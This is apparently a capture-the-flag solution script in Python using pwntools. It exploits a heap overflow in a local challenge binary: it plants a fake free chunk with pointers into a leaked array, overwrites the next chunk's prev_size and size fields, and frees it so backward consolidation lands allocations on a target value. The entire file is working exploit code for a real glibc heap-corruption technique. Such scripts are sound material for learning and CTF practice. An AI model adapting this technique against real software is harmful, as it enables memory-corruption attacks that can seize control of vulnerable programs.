from pwn import *

context.log_level = 'debug'

p = remote('localhost', 7002)
# p = process(['./ld-linux-x86-64.so.2', './chal'], env={"LD_PRELOAD": "./libc.so.6"})

def allocate(size):
    p.sendlineafter(b'fate:', b'1')
    p.sendlineafter(b'the warrior:', str(size).encode())

def free(index):
    p.sendlineafter(b'fate:', b'2')
    p.sendlineafter(b'(0-2):', str(index).encode())

def write(index, data):
    p.sendlineafter(b'fate:', b'3')
    p.sendlineafter(b'(-1 to 2):', str(index).encode())
    p.sendlineafter(b'power:', data)

def check():
    p.sendlineafter(b'fate:', b'4')

# Get array address from program output
p.recvuntil(b'Ancient memory is located at ')
recv = p.recvline()
array_addr = int(recv.strip(), 16)
log.success(f'Array address: {hex(array_addr)}')

# Allocate 2 chunks
allocate(104)  # chunk 0
p.recvuntil(b'summoned at ')
ptr0 = int(p.recvline().strip(), 16)

allocate(127)  # chunk 1
p.recvuntil(b'summoned at ')
ptr1 = int(p.recvline().strip(), 16)

# Create a fake free chunk 
prev_size = ptr1 - 0x10 - array_addr
log.success(f'prev_size: {hex(prev_size)}')
fake_chunk = p64(0) + p64(prev_size)    # prev_size and size field
fake_chunk += p64(array_addr)           # fd pointer pointing to array
fake_chunk += p64(array_addr)           # bk pointer pointing to array
fake_chunk += p64(array_addr)           # fake chunk's fd_nextsize
fake_chunk += p64(array_addr)           # fake chunk's bk_nextsize
fake_chunk += p64(0xdeadbeefcafebabe)   # comparision value

# Writing fake chunk to array
write(-1, fake_chunk)

# Overflow chunk 0 to overwrite chunk 1's prev_size and size field
write(0, b'A' * 96 + p64(prev_size) + p64(0x90))

# Free chunk 1 to consolidate
free(1)

# Check win condition
check()

p.interactive()